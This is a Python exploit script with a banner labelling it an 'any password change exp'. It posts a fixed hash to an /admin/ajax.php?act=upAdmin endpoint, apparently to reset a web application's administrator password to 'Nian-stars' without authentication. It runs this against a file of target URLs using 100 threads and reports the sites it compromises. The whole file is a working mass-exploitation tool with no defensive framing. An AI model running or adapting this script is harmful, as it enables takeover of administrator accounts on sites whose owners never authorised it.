# -*- coding: utf-8 -*-

import argparse
import json
import sys
import requests
from multiprocessing.dummy import Pool  # 表示的是多线程

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

 █████╗ ███╗   ██╗██╗   ██╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗      ██████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗
██╔══██╗████╗  ██║╚██╗ ██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝██║  ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝
███████║██╔██╗ ██║ ╚████╔╝     ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║    ██║     ███████║███████║██╔██╗ ██║██║  ███╗█████╗  
██╔══██║██║╚██╗██║  ╚██╔╝      ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║    ██║     ██╔══██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  
██║  ██║██║ ╚████║   ██║       ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝    ╚██████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝

                                                            tag:  An any password change exp
                                                            @version: 1.0.0
                                                            @author:  qs
    """
    print(test)


def exp(target):
    try:
        url = f"{target}/admin/ajax.php?act=upAdmin"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                   "Accept-Encoding": "gzip, deflate",
                   "X-REQUESTED-WITH": "XMLHttpRequest",
                   "DNT": "1",
                   "Connection": "close",
                   "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded"
                   }
        data = {"p": "39decdf75243aa22d16ee494916864b4"}
        res = requests.post(url, headers=headers, data=data, timeout=15, verify=False).text
        if json.loads(res.encode("utf-8"))["code"] == 1:
            print(f'站点:{target} ~*~*~ {json.loads(res.encode("utf-8"))["msg"]},修改之后的密码是Nian-stars')
        else:
            print(f'站点:{target} ~*~*~ {json.loads(res.encode("utf-8"))["msg"]}')
    except:
        pass


if __name__ == '__main__':
    banner()
    file = sys.argv[1]
    url_list = []
    with open(file, "r", encoding="utf-8") as f:
        for i in f.readlines():
            url = i.strip().replace("\n", "")
            url_list.append(url)
    mp = Pool(100)  # 表示的是线程数为100
    mp.map(exp, url_list)
    mp.close()
    mp.join()